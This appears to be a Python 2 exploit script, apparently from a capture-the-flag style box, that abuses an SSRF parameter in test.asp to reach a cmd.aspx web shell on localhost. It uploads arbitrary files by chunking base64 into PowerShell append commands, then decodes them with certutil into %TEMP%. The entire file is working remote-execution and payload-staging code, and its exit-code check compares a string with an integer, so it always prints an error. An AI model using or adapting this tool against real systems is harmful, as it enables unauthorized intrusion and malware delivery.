import requests  
import urllib2 
import base64 
import random 
import string
import os

url = 'http://10.10.10.57:62696' 
base_url = "/test.asp?u=http://127.0.0.1:80/cmd.aspx?xcmd=" 

def chunk_array(l, n): 
    """Yield successive n-sized chunks from l.""" 
    # https://stackoverflow.com/a/312464
    for i in range(0, len(l), n): 
        yield l[i:i + n] 

def read_file(filename): 
    b64data = None 
    with open(filename, 'rb') as ret: 
        data = ret.read() 
        b64data = base64.b64encode(data) 
    return b64data 

def file2powershell(filename):
    _, extension = os.path.splitext(filename)
    tfile = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(5)) 

    b64data = read_file(filename)
    chunks = chunk_array(b64data, 1600)

    commands = []
    for ch in chunks:
        command = "powershell -c \"$b64='{0}';[io.file]::AppendAllText('%TEMP%/{1}.b64', $b64);\"".format(ch, tfile)
        commands.append(command)
    commands.append('if exist %TEMP%/{0}.b64 (EXIT /B 0) ELSE (EXIT /B 1)'.format(tfile))
    commands.append('certutil -decode %TEMP%\\{0}.b64 %TEMP%\\{0}{1}'.format(tfile, extension))
    commands.append('if exist %TEMP%/{0}{1} (EXIT /B 0) ELSE (EXIT /B 1)'.format(tfile, extension))
    return commands 

def run_command(cmd): 
    req = requests.get(url+base_url+urllib2.quote(cmd)) 
    #TODO filter this properly 
    result = req.text 
    error_code = [x.split('=')[1] for x in result.split('\n') if "Exit Status" in x][0] 
    if error_code != 0:
        print "Error Code {0}\n{1}".format(error_code,cmd)
    else:
        print "SUCCESS!"
    return req.status_code 

def upload_file(filename, debug=False): 
    commands = file2powershell(filename)
    if debug==False: 
        for cmd in commands: 
            req = run_command(cmd) 
    else: 
        for i in commands: 
            print i 
    return filename 
